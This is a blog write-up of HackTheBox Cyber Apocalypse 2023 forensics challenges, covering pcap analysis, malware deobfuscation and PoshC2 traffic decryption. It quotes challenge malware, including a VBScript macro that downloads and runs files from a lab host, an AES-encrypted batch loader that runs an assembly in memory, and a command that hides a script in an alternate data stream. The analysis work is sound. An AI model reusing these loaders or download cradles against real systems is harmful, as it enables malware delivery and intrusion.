---
layout: post
title: "HackTheBox Cyber Apocalypse 2023 - Forensics"
category: CTF Writeups
tags: HackTheBox HTB-Cyber-Apocalypse-2023 CTF writeup
date: "2023-03-23 21:00:00 -0400"
---

![](/assets/img/ctf-writeups/ca2023/forensics/scoreboard.png)

I had a lot of fun with the forensics challenges! Looking at writeups for Bashic Ransomware, I probably could have gotten that one too but 8/10 is nothing to scoff at!

## Plaintext Treasure

Difficulty: Very Easy - 300 points

>Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server's administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin.

In this challenge, we are given a pcap packet capture file containing TCP and HTTP traffic.

![](/assets/img/ctf-writeups/ca2023/forensics/plaintext/pcap.png)

Following the TCP streams, I find the flag written in plaintext in the fourth TCP stream.

Flag: `HTB{th3s3_4l13ns_st1ll_us3_HTTP}`

![Packet capture](/assets/img/ctf-writeups/ca2023/forensics/plaintext/flag.png)

##  Alien Cradle

Difficulty: Very Easy - 300 points

> In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora's close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it?

In this challenge, we are given a Powershell script.

![flag](/assets/img/ctf-writeups/ca2023/forensics/alien_cradle/flag.png)

The flag is already visible in this section, we just need to put the pieces together.

```powershell
$s = New-Object IO.MemoryStream(,[Convert]::FromBase64String($d));$f = 'H' + 'T' + 'B' + '{p0w3rs' + 'h3ll' + '_Cr4d' + 'l3s_c4n_g3t' + '_th' + '3_j0b_d' + '0n3}';
```

Flag: `HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3}`

## Extraterrestrial Persistence

Difficulty: Very Easy - 300 points

> There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?

This challenge provides us a Bash script that downloads a service if the user pandora is logged into hostname linux_HQ, gives execution permission to it, and writes a Base64 encoded payload to `/usr/lib/systemd/service.service`. 

![](/assets/img/ctf-writeups/ca2023/forensics/et_persistence/script.png)

Decoding this payload, we find the flag in the description of the service.

![](/assets/img/ctf-writeups/ca2023/forensics/et_persistence/flag.png)

Flag: `HTB{th3s3_4l13nS_4r3_s00000_b4s1c}`

## Roten

Difficulty: Easy - 300 points

> The iMoS is responsible for collecting and analyzing targeting data across various galaxies. The data is collected through their webserver, which is accessible to authorized personnel only. However, the iMoS suspects that their webserver has been compromised, and they are unable to locate the source of the breach. They suspect that some kind of shell has been uploaded, but they are unable to find it. The iMoS have provided you with some network data to analyse, its up to you to save us.

This challenge presents another packet capture with TCP and HTTP traffic.

![](/assets/img/ctf-writeups/ca2023/forensics/roten/pcap.png)

Using the export objects feature in Wireshark, I find this obfuscated PHP webshell that was uploaded to the server on the map update page.

![](/assets/img/ctf-writeups/ca2023/forensics/roten/stream173.png)

Saving this PHP script, I noticed that the obfuscated portions were appended to one another and were evaluated at the end of the script.

![](/assets/img/ctf-writeups/ca2023/forensics/roten/obfshell.png)

Replacing the `eval()` statement with `echo()`, I would be able to get the deobfuscated shell script. In doing so, I revealed the flag in a comment.

![](/assets/img/ctf-writeups/ca2023/forensics/roten/flag.png)

Flag: `HTB{W0w_ROt_A_DaY}`

## Packet Cyclone

Difficulty: Easy - 300 points

> Pandora's friend and partner, Wade, is the one that leads the investigation into the relic's location. Recently, he noticed some weird traffic coming from his host. That led him to believe that his host was compromised. After a quick investigation, his fear was confirmed. Pandora tries now to see if the attacker caused the suspicious traffic during the exfiltration phase. Pandora believes that the malicious actor used rclone to exfiltrate Wade's research to the cloud. Using the tool called "chainsaw" and the sigma rules provided, can you detect the usage of rclone from the event logs produced by Sysmon? To get the flag, you need to start and connect to the docker service and answer all the questions correctly.

In this challenge, we are given Windows event logs and sigma rules that we need to use a tool called [chainsaw](https://github.com/WithSecureLabs/chainsaw) to parse. Using the command below, we get a match for two events.

![](/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/chainsaw.png)

These events correspond to execution of rclone.

![](/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/output.png)

With this information, I connected to the Docker instance and answered the questions that were asked of me.

![](/assets/img/ctf-writeups/ca2023/forensics/packet_cyclone/flag.png)

In return, I received the flag.

Flag: `HTB{3v3n_3xtr4t3rr3str14l_B31nGs_us3_Rcl0n3_n0w4d4ys}`

## Artifacts of Dangerous Sightings

Difficulty: Medium - 300 points

> Pandora has been using her computer to uncover the secrets of the elusive relic. She has been relentlessly scouring through all the reports of its sightings. However, upon returning from a quick coffee break, her heart races as she notices the Windows Event Viewer tab open on the Security log. This is so strange! Immediately taking control of the situation she pulls out the network cable, takes a snapshot of her machine and shuts it down. She is determined to uncover who could be trying to sabotage her research, and the only way to do that is by diving deep down and following all traces ...

In this challenge, we are given a VHDX virtual disk image. After loading the image into Autopsy, I ran a string search for some common strings, one one of them being `powershell`. In one of the first results, I noticed an interesting match.

![](/assets/img/ctf-writeups/ca2023/forensics/artifacts/ads.png)

The `type finpayload > C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1` line indicates that the payload was written to an Alternate Data Stream, hiding the Powershell script inside of `ActiveSyncProvider.dll`. In order to access this, I mounted the disk image in a Windows VM and used the `type C:\Windows\Tasks\ActiveSyncProvider.dll:hidden.ps1` command. Inside the alternate data stream, there was a Base64 encoded powershell payload that when decoded, revealed a heavily obfuscated Powershell script.

![](/assets/img/ctf-writeups/ca2023/forensics/artifacts/obfuscated.png)

I then used [PowerDecode](https://github.com/Malandrone/PowerDecode) to run dynamic analysis against the script. Initially, there were some errors in the script that had to be remedied, as well as me needing to enable long file names in the Registry, but it was able to deobfuscate the script and show the flag.

![](/assets/img/ctf-writeups/ca2023/forensics/artifacts/flag.png)

Flag: `HTB{Y0U_C4nt_St0p_Th3_Alli4nc3}`

## Relic Maps

Difficulty: Medium - 300 points

> Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what's going on and get the flag. The link is to http://relicmaps.htb:/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance).

For this challenge, we are given a link to a OneNote document (`relicmaps.one`) hosted on the Docker environment. Running strings against this file, I find a suspicious piece of VBScript that downloads two files, another OneNote document and a `window.bat` batch script.

```vb
'more code above...
Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
End Sub
'more code below...
```

Downloading the batch script, I see that it is quite obfuscated and the commented middle portion starting with SEWD appears to be a Base64 encoded string.

```batch
@echo off
set "eFlP=set "
%eFlP%"ualBOGvshk=ws"
%eFlP%"PxzdwcSExs= /"
%eFlP%"ndjtYQuanY=po"
%eFlP%"cHFmSnCqnE=Wi"
%eFlP%"CJnGNBkyYp=co"
%eFlP%"jaXcJXQMrV=rS"

snip

:: SEWD/RSJz4q93dq1c+u3tVcKPbLfn1fTrwl01pkHX3+NzcJ42N+ZgqbF+h+S76xsuroW3DDJ50IxTV/PbQICDVPjPCV3DYvCc244F7AFWphPY3kRy+618kpRSK2jW9RRcOnj8dOuDyeLwHfnBbkGgLE4KoSttWBplznkmb1l50KEFUavXv9ScKbGilo9+85NRKfafzpZjkMhwaCuzbuGZ1+5s9CdUwvo3znUpgmPX7S8K4+uS3SvQNh5iPNBdZHmyfZ9SbSATnsXlP757ockUsZTEdltSce4ZWF1779G6RjtKJcK4yrHGpRIZFYJ3pLosmm7d+SewKQu1vGJwcdLYuHOkdm5mglTyp20x7rDNCxobvCug4Smyrbs8XgS3R4jHMeUl7gdbyV/eTu0bQAMJnIql2pEU/dW0krE90nlgr3tbtitxw3p5nUP9hRYZLLMPOwJ12yNENS7Ics1ciqYh78ZWJiotAd4DEmAjr8zU4U...

snip

%CJnGNBkyYp%%UBndSzFkbH%%ujJtlzSIGW%%nwIWiBzpbz%%cHFmSnCqnE%%kTEDvsZUvn%%JBRccySrUq%%ZqjBENExAX%%XBucLtReBQ%%BFTOQBPCju%%vlwWETKcZH%%NCtxqhhPqI%%GOPdPuwuLd%%YcnfCLfyyS%%JPfTcZlwxJ%%ualBOGvshk%%xprVJLooVF%%cIqyYRJWbQ%%jaXcJXQMrV%%pMrovuxjjq%%KXASGLJNCX%%XzrrbwrpmM%%VCWZpprcdE%%tzMKflzfvX%%ndjtYQuanY%%chXxviaBCr%%tHJYExMHlP%%WmUoySsDby%%UrPeBlCopW%%lYCdEGtlPA%%eNOycQnIZD%%PxzdwcSExs%%VxroDYJQKR%%zhNAugCrcK%%XUpMhOyyHB%%OOOxFGwzUd%
cls
%dzPrbmmccE%%xQseEVnPet%
%eDhTebXJLa%%vShQyqnqqU%%KsuJogdoiJ%%uVLEiIUjzw%%SJsEzuInUY%%gNELMMjyFY%%XIAbFAgCIP%%weRTbbZPjT%%yQujDHraSv%%zwDBykiqZZ%%nfEeCcWKKK%%MtoMzhoqyY%%igJmqZApvQ%%SIQjFslpHA%%KHqiJghRbq%%WSRbQhwrOC%%BGoTReCegg%%WYJXnBQBDj%%SIneUaQPty%%WTAeYdswqF%%E
```

Running this script through DissectMalware's [batch_deobfuscator](https://github.com/DissectMalware/batch_deobfuscator), I got a somewhat readable version of the script.

![](/assets/img/ctf-writeups/ca2023/forensics/relic_maps/deobf.png)

Cleaning this up a bit, I can get a better idea of what's going on.

```batch
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y %~0.exe

cls
cd %~dp0
%~nx0.exe -noprofile -windowstyle hidden -ep bypass -command $eIfqq = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')('%~f0').Split([Environment]::NewLine)

foreach ($YiLGW in $eIfqq) { 
	if ($YiLGW.StartsWith(':: ')) {  
		$VuGcO = $YiLGW.Substring(3)
 		break
 	}
}

$uZOcm = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($VuGcO)
$BacUA = New-Object System.Security.Cryptography.AesManaged
$BacUA.Mode = [System.Security.Cryptography.CipherMode]::CBC
$BacUA.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$BacUA.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=')
$BacUA.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('2hn/J717js1MwdbbqMn7Lw==')
$Nlgap = $BacUA.CreateDecryptor()
$uZOcm = $Nlgap.TransformFinalBlock($uZOcm, 0, $uZOcm.Length)
$Nlgap.Dispose()
$BacUA.Dispose()
$mNKMr = New-Object System.IO.MemoryStream(, $uZOcm)
$bTMLk = New-Object System.IO.MemoryStream
$NVPbn = New-Object System.IO.Compression.GZipStream($mNKMr, [IO.Compression.CompressionMode]::Decompress)
$NVPbn.CopyTo($bTMLk)
$NVPbn.Dispose()
$mNKMr.Dispose()
$bTMLk.Dispose()
$uZOcm = $bTMLk.ToArray()
$gDBNO = [System.Reflection.Assembly]::('daoL'[-1..-4] -join '')($uZOcm)
$PtfdQ = $gDBNO.EntryPoint
$PtfdQ.Invoke($null, (, [string[]] ('%*')))
```

The script first copies Powershell to the present working directory and renames it to match the script's name,.
```batch
copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y %~0.exe

cls
cd %~dp0
```

The script then reads its contents for any line that starts with the characters `::` which correspond to a comment. In this case, the only line that matches this criteria is the Base64 string.

```batch
foreach ($YiLGW in $eIfqq) { 
	if ($YiLGW.StartsWith(':: ')) {  
		$VuGcO = $YiLGW.Substring(3)
 		break
 	}
}
```

The script then decodes and decrypts the payload using the provided AES key and initialization vector, and writes the memory stream to a gzip archive.

In order to obtain this file, I used the Base64 decode and AES decrypt functions on CyberChef. The 1F 8B hex bytes at the beginning confirm that this is a gzip archive.

![](/assets/img/ctf-writeups/ca2023/forensics/relic_maps/gz.png)

![](/assets/img/ctf-writeups/ca2023/forensics/relic_maps/signature.png)

Using the gunzip operation, I extracted the contents of the archive, which turned out to be a Windows portable executable binary.

![](/assets/img/ctf-writeups/ca2023/forensics/relic_maps/gunzip.png)

Further down in the binary, I noticed a string that appeared to be a flag, but with null bytes in between the characters. 

![](/assets/img/ctf-writeups/ca2023/forensics/relic_maps/flag_space.png)

Using the remove whitespace operation, I was able to make this string more readable and obtain the flag.

![](/assets/img/ctf-writeups/ca2023/forensics/relic_maps/flag.png)

Flag: `HTB{0neN0Te?_iT'5_4_tr4P!}`

## Interstellar C2

Difficulty: Hard - 325 points

> We noticed some interesting traffic coming from outer space. An unknown group is using a Command and Control server. After an exhaustive investigation, we discovered they had infected multiple scientists from Pandora's private research lab. Valuable research is at risk. Can you find out how the server works and retrieve what was stolen?

This challenge gives us another packet capture with TCP and HTTP traffic. Following the TCP streams, the very first stream is a GET request for a powershell script.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/ps1.png)

Similar to the batch script in the previous challenge, this script is obfuscated and utilizes AES encryption. I attempted to use PowerDecode, which failed, but [PSDecode](https://github.com/R3MRUM/PSDecode) was successful.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/deobf.png)

This script downloads an external payload and moves it to the temporary directory, decrypts the payload, and runs the resultant executable.

The third TCP stream shows the capture of the payload being downloaded.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/download.png)

I recovered this payload from the packet capture and decrypted it using CyberChef.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/binary.png)

I then downloaded the binary and loaded into Ghidra for analysis. There were a few different functions, including Encryption, Decryption, and ImplantCore. I also ran a search for strings, which returned a few interesting results. The most interesting was a file name, `dropper_cs.exe`.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/funcs.png)

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/dropper.png)

A quick online search revealed that this was most likely a dropper for [PoshC2](https://github.com/nettitude/PoshC2), a popular open-source command and control framework. 

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/search.png)

I verified this by comparing the strings that Ghidra located to the [source code](https://github.com/infosecn1nja/PoshC2_Python/blob/master/Files/dropper.cs) for this dropper.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/strings.png)

This [blog post](https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2021/08/28/posh_c2_-_commandandcontrol-xVbY.html) from Keysight goes into detail about how PoshC2 works, and this was the basis for me solving this challenge.

For the next stage (stage 1 in the blog post), there is a request with a session ID that is both Base64 encoded and AES encrypted. 

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/stage1.png)

Fortunately for us, the binary contains the Base64 encoded AES private key.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/base64.png)

I wrote a Python script based off the ruby script that the author of the blog post used to decrypt the payload.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/decrypt.png)

In this decrypted payload, I can barely makeout the new AES key that is used to encrypt the future communications, as well as random URIs that are used for beaconing and task execution.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/newkey.png)

For task execution, the contents of the GET request are encoded and encrypted as well. The task responses are POST requests that are back to the C2 server in a complex form. The output is first compressed using Gzip, then encrypted with AES, and then is appended to a 1500 byte PNG image before being sent back to the C2 server. So I started looking for POST requests.

When I looked at the HTTP objects, I noticed one that was much larger than the others. This object corresponded to a request that began at packet 7242. Given its large size, I decided to investigate it first.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/largepost.png)

I wrote a script to decrypt and decode the data from the task's output.

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import gzip

def get_file():
    private_key = base64.b64decode('nUbFDDJadpsuGML4Jxsq58nILvjoNu76u4FIHVGIKSQ=')
    enc=bytes.fromhex(data)[1500:]
    iv = enc[0:16]
    enc=enc[16:]
    obj = AES.new(private_key, AES.MODE_CBC, iv)
    dec = obj.decrypt(enc)
    return gzip.decompress(dec).decode()

f = open("pkt7242-hex", "r")
data = f.read()

g = open("test","wb")
out_file = get_file()
g.write(base64.b64decode(out_file))
```

I took the input from that large post request, converted it to hex, and fed it into the script. I added the second base64 decode statement after I discovered that the output was also base64 encoded.

The output of the file turned out to be a PNG image file!

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/image.png)

Opening the image in ristretto, I see the flag in a sticky note in the top right corner of the screen.

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/flag.png)

![](/assets/img/ctf-writeups/ca2023/forensics/interstellar_c2/cropped_flag.png)

Flag: `HTB{h0w_c4N_y0U_s3e_p05H_c0mM4nd?}`